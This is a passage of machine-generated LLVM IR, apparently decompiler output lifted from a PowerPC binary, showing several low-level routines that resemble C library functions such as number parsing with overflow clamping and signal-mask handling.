  store i32 34, i32* %v2_100087e4, align 4
  %v0_10008780.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10008788.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10008788.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008780

dec_label_pc_100087ec:                            ; preds = %dec_label_pc_100087c8
  %v2_100087ec = mul i32 %v1_100087bc, %v0_100087ec
  %v2_100087f0 = add i32 %v2_100087ec, %v1_100087f0
  store i32 %v2_100087f0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008780

dec_label_pc_100087f8:                            ; preds = %dec_label_pc_100087bc, %dec_label_pc_10008758
  %v0_10008800 = phi i32 [ %v0_1000880014, %dec_label_pc_10008758 ], [ %v0_1000880012, %dec_label_pc_100087bc ]
  %v0_100087f8 = load i32, i32* %r25.global-to-local, align 4
  %v3_100087f8 = icmp eq i32 %v0_100087f8, 0
  br i1 %v3_100087f8, label %dec_label_pc_10008804, label %dec_label_pc_10008800

dec_label_pc_10008800:                            ; preds = %dec_label_pc_100087f8
  %v2_10008800 = inttoptr i32 %v0_100087f8 to i32*
  store i32 %v0_10008800, i32* %v2_10008800, align 4
  br label %dec_label_pc_10008804

dec_label_pc_10008804:                            ; preds = %dec_label_pc_100087f8, %dec_label_pc_10008800
  %v0_10008804 = load i32, i32* %r26.global-to-local, align 4
  %v3_10008804 = icmp eq i32 %v0_10008804, 0
  %v0_10008808 = load i32, i32* %r28.global-to-local, align 4
  %v1_10008808 = sub i32 0, %v0_10008808
  %tmp27 = lshr i32 %v1_10008808, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_10008848.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_10008804, label %dec_label_pc_10008838, label %dec_label_pc_10008820

dec_label_pc_10008820:                            ; preds = %dec_label_pc_10008804
  %v3_10008820 = icmp ugt i32 %v0_10008848.pre.pre, %tmp28
  br i1 %v3_10008820, label %dec_label_pc_10008828, label %dec_label_pc_10008838

dec_label_pc_10008828:                            ; preds = %dec_label_pc_10008820
  %v0_10008828 = call i32 @function_10004b48()
  %v2_10008830 = inttoptr i32 %v0_10008828 to i32*
  store i32 34, i32* %v2_10008830, align 4
  %v0_10008834 = load i32, i32* @r31, align 4
  store i32 %v0_10008834, i32* %r8.global-to-local, align 4
  %v0_10008838.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10008838

dec_label_pc_10008838:                            ; preds = %dec_label_pc_10008804, %dec_label_pc_10008820, %dec_label_pc_10008828
  %v0_10008848.pre = phi i32 [ %v0_10008848.pre.pre, %dec_label_pc_10008820 ], [ %v0_10008834, %dec_label_pc_10008828 ], [ %v0_10008848.pre.pre, %dec_label_pc_10008804 ]
  %v0_10008838 = phi i32 [ %v0_10008808, %dec_label_pc_10008820 ], [ %v0_10008838.pre, %dec_label_pc_10008828 ], [ %v0_10008808, %dec_label_pc_10008804 ]
  %v3_10008838 = icmp eq i32 %v0_10008838, 0
  br i1 %v3_10008838, label %dec_label_pc_10008844, label %dec_label_pc_10008840

dec_label_pc_10008840:                            ; preds = %dec_label_pc_10008838
  %v1_10008840 = sub i32 0, %v0_10008848.pre
  store i32 %v1_10008840, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008844

dec_label_pc_10008844:                            ; preds = %dec_label_pc_10008838, %dec_label_pc_10008840
  %v0_10008848 = phi i32 [ %v1_10008840, %dec_label_pc_10008840 ], [ %v0_10008848.pre, %dec_label_pc_10008838 ]
  ret i32 %v0_10008848

; uselistorder directives
  uselistorder i32 %v0_10008848.pre, { 1, 0 }
  uselistorder i32 %v0_10008848.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_100087f0, { 1, 0 }
  uselistorder i32 %v1_1000879c, { 1, 0 }
  uselistorder i32 %v1_10008798, { 1, 0 }
  uselistorder i32 %v1_10008790, { 1, 0 }
  uselistorder i32 %v3_10008784, { 1, 0 }
  uselistorder i32 %v0_100087ec, { 1, 0, 2 }
  uselistorder i32 %v1_1000878c, { 0, 2, 1 }
  uselistorder i32 %v0_10008780, { 1, 0 }
  uselistorder i32 %v2_1000876c, { 1, 0, 2 }
  uselistorder i32 %v1_10008744, { 1, 0 }
  uselistorder i32 %v1_10008730, { 1, 0, 2 }
  uselistorder i32 %v0_1000870c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder label %dec_label_pc_10008844, { 1, 0 }
  uselistorder label %dec_label_pc_10008838, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008804, { 1, 0 }
  uselistorder label %dec_label_pc_100087bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008784, { 1, 0 }
  uselistorder label %dec_label_pc_10008758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000874c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008710, { 1, 0 }
  uselistorder label %dec_label_pc_1000870c, { 1, 0 }
  uselistorder label %dec_label_pc_100086d8, { 1, 0 }
}

define i32 @function_1000885c() local_unnamed_addr {
dec_label_pc_1000885c:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008874 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10008880 = load i32, i32* @r3, align 4
  store i32 %v0_10008880, i32* @r31, align 4
  store i32 %v2_10008874, i32* @r3, align 4
  %v0_1000888c = call i32 @function_10008c84()
  %v0_10008894 = call i32 @function_10008c7c()
  %v3_1000889c = load i32, i32* @global_var_100104a0.274, align 4
  %v3_100088a0 = icmp eq i32 %v3_1000889c, 0
  br i1 %v3_100088a0, label %dec_label_pc_100088b4, label %dec_label_pc_100088a8

dec_label_pc_100088a8:                            ; preds = %dec_label_pc_1000885c
  %v0_100088a8 = load i32, i32* @r31, align 4
  %v3_100088b0 = call i32 @unknown_0(i32 %v0_100088a8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_100088b4

dec_label_pc_100088b4:                            ; preds = %dec_label_pc_1000885c, %dec_label_pc_100088a8
  store i32 %v2_10008874, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_100088bc = call i32 @function_10008c84()
  store i32 %v0_100088bc, i32* @r3, align 4
  store i32 268470468, i32* @lr, align 4
  %v1_100088c0 = call i32 @function_10008be8(i32 %v0_100088bc)
  store i32 268470488, i32* @lr, align 4
  %v2_100088d4 = call i32 @function_10005484(i32 %v1_100088c0, i32 268457092)
  %v0_100088d8 = load i32, i32* @r31, align 4
  %v1_100088dc = call i32 @function_10009114(i32 %v0_100088d8)
  ret i32 %v1_100088dc

; uselistorder directives
  uselistorder label %dec_label_pc_100088b4, { 1, 0 }
}

define i32 @function_100088e0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_100088e0:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100088e0 = ptrtoint i32* %stack_var_0 to i32
  %v2_100088fc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100088fc, i32* %r0.global-to-local, align 4
  %v2_10008904 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100088fc, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008930

dec_label_pc_10008930:                            ; preds = %dec_label_pc_10008960, %dec_label_pc_100088e0
  %v0_10008934 = phi i32 [ 0, %dec_label_pc_100088e0 ], [ %v1_10008934, %dec_label_pc_10008960 ]
  %stack_var_-52.0 = phi i32 [ %v2_10008904, %dec_label_pc_100088e0 ], [ %stack_var_-52.1, %dec_label_pc_10008960 ]
  %stack_var_-56.0 = phi i8 [ 2, %dec_label_pc_100088e0 ], [ %stack_var_-56.1, %dec_label_pc_10008960 ]
  %v4_10008930 = zext i8 %stack_var_-56.0 to i32
  %v1_10008934 = add i32 %v0_10008934, 1
  %v1_1000893c = mul nuw nsw i32 %v4_10008930, 4
  store i32 %v1_1000893c, i32* %r0.global-to-local, align 4
  %v2_10008940 = add i32 %v1_1000893c, %v2_100088fc
  store i32 %v2_10008940, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10008954, label %dec_label_pc_1000894c

dec_label_pc_1000894c:                            ; preds = %dec_label_pc_10008930
  %v1_10008944 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10008960

dec_label_pc_10008954:                            ; preds = %dec_label_pc_10008930
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10008958 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10008958, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008960

dec_label_pc_10008960:                            ; preds = %dec_label_pc_1000894c, %dec_label_pc_10008954
  %stack_var_-52.1 = phi i32 [ %v1_10008958, %dec_label_pc_10008954 ], [ %stack_var_-52.0, %dec_label_pc_1000894c ]
  %v0_10008960 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10008954 ], [ %v2_10008940, %dec_label_pc_1000894c ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10008954 ], [ %v1_10008944, %dec_label_pc_1000894c ]
  %v1_10008960 = inttoptr i32 %v0_10008960 to i32*
  %v2_10008960 = load i32, i32* %v1_10008960, align 4
  store i32 %v2_10008960, i32* %r0.global-to-local, align 4
  %v3_10008964 = icmp eq i32 %v2_10008960, 0
  br i1 %v3_10008964, label %dec_label_pc_1000896c, label %dec_label_pc_10008930

dec_label_pc_1000896c:                            ; preds = %dec_label_pc_10008960
  %v1_1000896c = mul i32 %v1_10008934, 4
  store i32 %v4_100088e0, i32* %r0.global-to-local, align 4
  %v1_10008974 = add i32 %v1_1000896c, 34
  store i32 %v1_10008934, i32* %ctr.global-to-local, align 4
  %v1_1000897c = call i32 @__asm_rlwinm(i32 %v1_10008974, i32 0, i32 0, i32 27)
  %v1_10008984 = load i32, i32* @r1, align 4
  %v3_10008984 = sub i32 %v1_10008984, %v1_1000897c
  %v4_10008984 = inttoptr i32 %v3_10008984 to i32*
  store i32 %v4_100088e0, i32* %v4_10008984, align 4
  %v1_10008988 = add i32 %v3_10008984, 23
  store i32 %v1_10008988, i32* %r0.global-to-local, align 4
  %v1_1000898c = call i32 @__asm_rlwinm(i32 %v1_10008988, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008994 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008994 = inttoptr i32 %v1_1000898c to i32*
  store i32 %v0_10008994, i32* %v2_10008994, align 4
  store i32 %v1_1000898c, i32* %r11.global-to-local, align 4
  %v0_1000899c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000899c = trunc i32 %v0_1000899c to i8
  store i32 %v2_100088fc, i32* %r0.global-to-local, align 4
  store i32 %v2_100088fc, i32* %stack_var_-48, align 4
  br label %dec_label_pc_100089b0

dec_label_pc_100089b0:                            ; preds = %dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge, %dec_label_pc_1000896c
  %v0_100089b4 = phi i32 [ %v1_1000898c, %dec_label_pc_1000896c ], [ %v0_100089b4.pre, %dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_10008904, %dec_label_pc_1000896c ], [ %stack_var_-52.3, %dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000899c, %dec_label_pc_1000896c ], [ %stack_var_-56.3, %dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge ]
  %v1_100089b4 = add i32 %v0_100089b4, 4
  store i32 %v1_100089b4, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_100089d8, label %dec_label_pc_100089c8

dec_label_pc_100089c8:                            ; preds = %dec_label_pc_100089b0
  %v4_100089b0 = zext i8 %stack_var_-56.2 to i32
  %v1_100089c0 = add i8 %stack_var_-56.2, 1
  %v1_100089bc = mul nuw nsw i32 %v4_100089b0, 4
  %v3_100089c8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_100089c8, i32* %r0.global-to-local, align 4
  %v2_100089d0 = add i32 %v3_100089c8, %v1_100089bc
  br label %dec_label_pc_100089e4

dec_label_pc_100089d8:                            ; preds = %dec_label_pc_100089b0
  %v1_100089dc = add i32 %stack_var_-52.2, 4
  store i32 %v1_100089dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100089e4

dec_label_pc_100089e4:                            ; preds = %dec_label_pc_100089c8, %dec_label_pc_100089d8
  %stack_var_-52.3 = phi i32 [ %v1_100089dc, %dec_label_pc_100089d8 ], [ %stack_var_-52.2, %dec_label_pc_100089c8 ]
  %v0_100089e4 = phi i32 [ %stack_var_-52.2, %dec_label_pc_100089d8 ], [ %v2_100089d0, %dec_label_pc_100089c8 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_100089d8 ], [ %v1_100089c0, %dec_label_pc_100089c8 ]
  %v1_100089e4 = inttoptr i32 %v0_100089e4 to i32*
  %v2_100089e4 = load i32, i32* %v1_100089e4, align 4
  store i32 %v2_100089e4, i32* %r0.global-to-local, align 4
  %v2_100089e8 = inttoptr i32 %v1_100089b4 to i32*
  store i32 %v2_100089e4, i32* %v2_100089e8, align 4
  %v0_100089ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_100089ec = add i32 %v0_100089ec, -1
  store i32 %v1_100089ec, i32* %ctr.global-to-local, align 4
  %v2_100089ec = icmp eq i32 %v1_100089ec, 0
  br i1 %v2_100089ec, label %dec_label_pc_100089f0, label %dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge

dec_label_pc_100089e4.dec_label_pc_100089b0_crit_edge: ; preds = %dec_label_pc_100089e4
  %v0_100089b4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100089b0

dec_label_pc_100089f0:                            ; preds = %dec_label_pc_100089e4
  %v3_100089f4 = load i32, i32* @global_var_100104a8.276, align 4
  store i32 268470780, i32* @lr, align 4
  %v2_100089f8 = call i32 @function_10009198(i32 %v3_100089f4, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v0_100089fc = load i32, i32* @r1, align 4
  %v1_100089fc = inttoptr i32 %v0_100089fc to i32*
  %v2_100089fc = load i32, i32* %v1_100089fc, align 4
  store i32 %v2_100089fc, i32* %r11.global-to-local, align 4
  %v1_10008a00 = add i32 %v2_100089fc, 4
  %v2_10008a00 = inttoptr i32 %v1_10008a00 to i32*
  %v3_10008a00 = load i32, i32* %v2_10008a00, align 4
  store i32 %v3_10008a00, i32* %r0.global-to-local, align 4
  ret i32 %v2_100089f8

; uselistorder directives
  uselistorder i32 %v1_100089ec, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000893c, { 1, 0 }
  uselistorder i32 %v1_10008934, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100088fc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_100089e4, { 1, 0 }
  uselistorder label %dec_label_pc_10008960, { 1, 0 }
}

define i32 @function_10008a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008a14:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10008a14 = icmp eq i32 %arg1, 0
  br i1 %v3_10008a14, label %dec_label_pc_10008bc8, label %dec_label_pc_10008a44.lr.ph

dec_label_pc_10008a44.lr.ph:                      ; preds = %dec_label_pc_10008a14
  %v2_10008a38 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10008a38, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10008a4445 = add i32 %v2_10008a38, 132
  %v3_10008a4446 = inttoptr i32 %v2_10008a4445 to i32*
  store i32 0, i32* %v3_10008a4446, align 4
  %v0_10008a4847 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008a4848 = add i32 %v0_10008a4847, -1
  store i32 %v1_10008a4848, i32* %r11.global-to-local, align 4
  %v1_10008a4c49 = mul i32 %v1_10008a4848, 4
  %v1_10008a5050 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008a5051 = add i32 %v1_10008a5050, %v1_10008a4c49
  %v0_10008a5452 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008a5453 = add i32 %v0_10008a5452, -1
  store i32 %v1_10008a5453, i32* %ctr.global-to-local, align 4
  %v2_10008a5454 = icmp eq i32 %v1_10008a5453, 0
  br i1 %v2_10008a5454, label %dec_label_pc_10008a58, label %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge

dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge: ; preds = %dec_label_pc_10008a44.lr.ph, %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge
  %v2_10008a5055 = phi i32 [ %v2_10008a50, %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge ], [ %v2_10008a5051, %dec_label_pc_10008a44.lr.ph ]
  %v0_10008a44.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008a44 = add i32 %v2_10008a5055, 8
  %v3_10008a44 = inttoptr i32 %v2_10008a44 to i32*
  store i32 %v0_10008a44.pre, i32* %v3_10008a44, align 4
  %v0_10008a48 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008a48 = add i32 %v0_10008a48, -1
  store i32 %v1_10008a48, i32* %r11.global-to-local, align 4
  %v1_10008a4c = mul i32 %v1_10008a48, 4
  %v1_10008a50 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008a50 = add i32 %v1_10008a50, %v1_10008a4c
  %v0_10008a54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008a54 = add i32 %v0_10008a54, -1
  store i32 %v1_10008a54, i32* %ctr.global-to-local, align 4
  %v2_10008a54 = icmp eq i32 %v1_10008a54, 0
  br i1 %v2_10008a54, label %dec_label_pc_10008a58, label %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge

dec_label_pc_10008a58:                            ; preds = %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge, %dec_label_pc_10008a44.lr.ph
  %v2_10008a50.lcssa = phi i32 [ %v2_10008a5051, %dec_label_pc_10008a44.lr.ph ], [ %v2_10008a50, %dec_label_pc_10008a44.dec_label_pc_10008a44_crit_edge ]
  %v0_10008a6c.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10008a58 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10008a58, i32* %r29.global-to-local, align 4
  store i32 %v2_10008a58, i32* %r3.global-to-local, align 4
  store i32 %v0_10008a6c.pre, i32* %stack_var_-440, align 4
  %v3_10008a70 = call i32 @function_1000b340(i32 %v2_10008a58, i32 17, i32 %v2_10008a50.lcssa)
  store i32 %v3_10008a70, i32* %r3.global-to-local, align 4
  %v1_10008a74 = icmp slt i32 %v3_10008a70, 0
  br i1 %v1_10008a74, label %dec_label_pc_10008bd0, label %dec_label_pc_10008a7c

dec_label_pc_10008a7c:                            ; preds = %dec_label_pc_10008a58
  %v2_10008a7c = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268470928, i32* @lr, align 4
  %v3_10008a8c = call i32 @function_10009488(i32 0, i32 %v2_10008a58, i32 %v2_10008a7c)
  store i32 %v3_10008a8c, i32* %r3.global-to-local, align 4
  %v3_10008a90 = icmp eq i32 %v3_10008a8c, 0
  br i1 %v3_10008a90, label %dec_label_pc_10008a98, label %dec_label_pc_10008bd0

dec_label_pc_10008a98:                            ; preds = %dec_label_pc_10008a7c
  store i32 %v2_10008a7c, i32* %r3.global-to-local, align 4
  %v2_10008aa0 = call i32 @function_1000b318(i32 %v2_10008a7c, i32 17)
  store i32 %v2_10008aa0, i32* %r3.global-to-local, align 4
  %v3_10008aa4 = icmp eq i32 %v2_10008aa0, 0
  br i1 %v3_10008aa4, label %dec_label_pc_10008ac4.lr.ph, label %dec_label_pc_10008b90

dec_label_pc_10008ac4.lr.ph:                      ; preds = %dec_label_pc_10008a98
  store i32 %v2_10008a38, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10008a4446, align 4
  %v0_10008ac836 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008ac837 = add i32 %v0_10008ac836, -1
  store i32 %v1_10008ac837, i32* %r11.global-to-local, align 4
  %v1_10008acc38 = mul i32 %v1_10008ac837, 4
  %v1_10008ad039 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008ad040 = add i32 %v1_10008ad039, %v1_10008acc38
  %v0_10008ad441 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad442 = add i32 %v0_10008ad441, -1
  store i32 %v1_10008ad442, i32* %ctr.global-to-local, align 4
  %v2_10008ad443 = icmp eq i32 %v1_10008ad442, 0
  br i1 %v2_10008ad443, label %dec_label_pc_10008ad8, label %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge

dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge: ; preds = %dec_label_pc_10008ac4.lr.ph, %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge
  %v2_10008ad044 = phi i32 [ %v2_10008ad0, %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge ], [ %v2_10008ad040, %dec_label_pc_10008ac4.lr.ph ]
  %v0_10008ac4.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10008ac4 = add i32 %v2_10008ad044, 8
  %v3_10008ac4 = inttoptr i32 %v2_10008ac4 to i32*
  store i32 %v0_10008ac4.pre, i32* %v3_10008ac4, align 4
  %v0_10008ac8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008ac8 = add i32 %v0_10008ac8, -1
  store i32 %v1_10008ac8, i32* %r11.global-to-local, align 4
  %v1_10008acc = mul i32 %v1_10008ac8, 4
  %v1_10008ad0 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008ad0 = add i32 %v1_10008ad0, %v1_10008acc
  %v0_10008ad4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad4 = add i32 %v0_10008ad4, -1
  store i32 %v1_10008ad4, i32* %ctr.global-to-local, align 4
  %v2_10008ad4 = icmp eq i32 %v1_10008ad4, 0
  br i1 %v2_10008ad4, label %dec_label_pc_10008ad8, label %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge

dec_label_pc_10008ad8:                            ; preds = %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge, %dec_label_pc_10008ac4.lr.ph
  %v2_10008ad0.lcssa = phi i32 [ %v2_10008ad040, %dec_label_pc_10008ac4.lr.ph ], [ %v2_10008ad0, %dec_label_pc_10008ac4.dec_label_pc_10008ac4_crit_edge ]
  store i32 %v2_10008a58, i32* %r3.global-to-local, align 4
  %v3_10008ae0 = call i32 @function_1000b340(i32 %v2_10008a58, i32 17, i32 %v2_10008ad0.lcssa)
  store i32 %v3_10008ae0, i32* %r3.global-to-local, align 4
  %v1_10008ae4 = icmp slt i32 %v3_10008ae0, 0
  br i1 %v1_10008ae4, label %dec_label_pc_10008bd0, label %dec_label_pc_10008aec

dec_label_pc_10008aec:                            ; preds = %dec_label_pc_10008ad8
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10008af4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268471036, i32* @lr, align 4
  %v4_10008af8 = call i32 @function_1000b254(i32 17, i32* null, i32 %v2_10008af4)
  store i32 %v4_10008af8, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10008af8, -1
  br i1 %tmp33, label %dec_label_pc_10008b2c, label %dec_label_pc_10008b04

dec_label_pc_10008b04:                            ; preds = %dec_label_pc_10008aec
  %v0_10008b04 = call i32 @function_10004b48()
  store i32 %v0_10008b04, i32* %r3.global-to-local, align 4
  %v1_10008b0c = inttoptr i32 %v0_10008b04 to i32*
  %v2_10008b0c = load i32, i32* %v1_10008b0c, align 4
  store i32 %v0_10008b04, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471072, i32* @lr, align 4
  %v3_10008b1c = call i32 @function_10009488(i32 2, i32 %v2_10008a7c, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10008b24 = inttoptr i32 %v0_10008b04 to i32*
  store i32 %v2_10008b0c, i32* %v2_10008b24, align 4
  %v0_10008be4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd4

dec_label_pc_10008b2c:                            ; preds = %dec_label_pc_10008aec
  %v3_10008b2c = load i32, i32* %stack_var_-176, align 4
  %v3_10008b38 = icmp eq i32 %v3_10008b2c, 1
  br i1 %v3_10008b38, label %dec_label_pc_10008b40, label %dec_label_pc_10008b74

dec_label_pc_10008b40:                            ; preds = %dec_label_pc_10008b2c
  store i32 %v2_10008a38, i32* %r3.global-to-local, align 4
  store i32 268471116, i32* @lr, align 4
  %v2_10008b48 = call i32 @function_10009300(i32 %v2_10008a38, i32 %v2_10008a38)
  store i32 %v2_10008b48, i32* %r3.global-to-local, align 4
  store i32 %v2_10008b48, i32* @r31, align 4
  %v0_10008b50 = call i32 @function_10004b48()
  store i32 %v0_10008b50, i32* %r3.global-to-local, align 4
  store i32 %v0_10008b50, i32* %r29.global-to-local, align 4
  %v1_10008b60 = inttoptr i32 %v0_10008b50 to i32*
  %v2_10008b60 = load i32, i32* %v1_10008b60, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471148, i32* @lr, align 4
  %v3_10008b68 = call i32 @function_10009488(i32 2, i32 %v2_10008a7c, i32 0)
  store i32 %v3_10008b68, i32* %r3.global-to-local, align 4
  %v1_10008b6c = load i32, i32* %r29.global-to-local, align 4
  %v2_10008b6c = inttoptr i32 %v1_10008b6c to i32*
  store i32 %v2_10008b60, i32* %v2_10008b6c, align 4
  %v0_10008b9c.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008b9c

dec_label_pc_10008b74:                            ; preds = %dec_label_pc_10008b2c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268471172, i32* @lr, align 4
  %v3_10008b80 = call i32 @function_10009488(i32 2, i32 %v2_10008a7c, i32 0)
  br label %dec_label_pc_10008b90

dec_label_pc_10008b90:                            ; preds = %dec_label_pc_10008a98, %dec_label_pc_10008b74
  store i32 %v2_10008a38, i32* %r3.global-to-local, align 4
  store i32 268471192, i32* @lr, align 4
  %v2_10008b94 = call i32 @function_10009300(i32 %v2_10008a38, i32 %v2_10008a38)
  store i32 %v2_10008b94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008b9c

dec_label_pc_10008b9c:                            ; preds = %dec_label_pc_10008b40, %dec_label_pc_10008b90
  %v0_10008b9c = phi i32 [ %v0_10008b9c.pr, %dec_label_pc_10008b40 ], [ %v2_10008b94, %dec_label_pc_10008b90 ]
  %v3_10008b9c = icmp eq i32 %v0_10008b9c, 0
  br i1 %v3_10008b9c, label %dec_label_pc_10008bc8, label %dec_label_pc_10008ba4

dec_label_pc_10008ba4:                            ; preds = %dec_label_pc_10008b9c
  %v3_10008bb4 = load i32, i32* %stack_var_-440, align 4
  %v0_10008bb8 = call i32 @__asm_mfcr()
  store i32 %v0_10008bb8, i32* %r3.global-to-local, align 4
  %v1_10008bbc = call i32 @__asm_rlwinm(i32 %v0_10008bb8, i32 30, i32 31, i32 31)
  %v2_10008bc0 = add i32 %v3_10008bb4, %v1_10008bbc
  store i32 %v2_10008bc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd4

dec_label_pc_10008bc8:                            ; preds = %dec_label_pc_10008b9c, %dec_label_pc_10008a14
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd4

dec_label_pc_10008bd0:                            ; preds = %dec_label_pc_10008a7c, %dec_label_pc_10008ad8, %dec_label_pc_10008a58
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bd4

